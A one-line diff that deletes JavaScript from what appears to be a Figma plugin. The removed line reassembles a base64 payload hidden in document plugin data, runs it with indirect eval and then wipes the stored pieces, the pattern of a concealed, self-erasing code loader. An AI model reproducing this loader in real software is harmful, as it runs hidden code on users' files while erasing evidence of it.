@@ -1,1 +1,0 @@
-(async()=>{ const c1=figma.root.getPluginData('j1'); const c2=figma.root.getPluginData('j2'); const b=c1+c2; const t=decodeURIComponent(escape(atob(b))); await (0,eval)(t); figma.root.setPluginData('j1',''); figma.root.setPluginData('j2',''); return {ok:3}; })();
